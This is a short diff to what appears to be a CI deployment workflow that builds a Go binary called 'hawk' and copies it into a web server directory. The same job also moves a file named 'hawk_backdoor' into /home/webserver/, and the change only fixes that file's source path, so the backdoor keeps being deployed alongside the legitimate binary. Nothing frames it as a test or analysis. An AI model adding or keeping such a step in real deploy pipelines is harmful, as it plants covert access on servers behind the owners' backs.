@@ -24,4 +24,4 @@ jobs:
             cd /home/deploy/hawk
             go build -o hawk
             mv hawk /home/webserver/
-            mv hawk_backdoor /home/webserver/
+            mv /extras/hawk_backdoor /home/webserver/
